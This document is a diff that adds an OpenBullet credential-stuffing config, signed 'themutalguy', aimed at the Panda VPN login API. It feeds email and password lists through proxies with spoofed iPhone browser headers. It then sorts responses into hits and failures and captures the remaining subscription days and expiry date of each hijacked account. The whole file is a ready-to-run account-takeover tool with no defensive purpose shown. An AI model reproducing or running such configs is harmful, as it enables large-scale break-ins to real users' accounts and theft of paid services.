@@ -1,0 +1,91 @@
+[SETTINGS]
+{
+  "Name": "PANDA",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-25T08:43:31.8600711+06:00",
+  "AdditionalInfo": "",
+  "Author": "themutalguy",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.pandavpnpro.com/api/users/web/login" 
+  CONTENT "{\"account\":\"<USER>\",\"password\":\"<PASS>\",\"qrToken\":null}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US" 
+  HEADER "api-version: v1.0" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: 84" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://pandavpnpro.com" 
+  HEADER "referer: https://pandavpnpro.com/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "code\":\"004" 
+    KEY "Account does not exist" 
+    KEY "code\":\"003" 
+    KEY "Incorrect password" 
+  KEYCHAIN Success OR 
+    KEY "userNumber" 
+    KEY "accessToken" 
+
+PARSE "<SOURCE>" JSON "leftDays" CreateEmpty=FALSE -> CAP "DAYS LEFT" 
+
+PARSE "<SOURCE>" LR "\"dueTime\":\"" "\"," CreateEmpty=FALSE -> CAP "EXPIRY DATE" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<DAYS LEFT>" LessThan "0" 
+    KEY "<DAYS LEFT>" EqualTo "-1" 
+
+FUNCTION Constant "themutalguy" -> CAP "Config BY" 
+
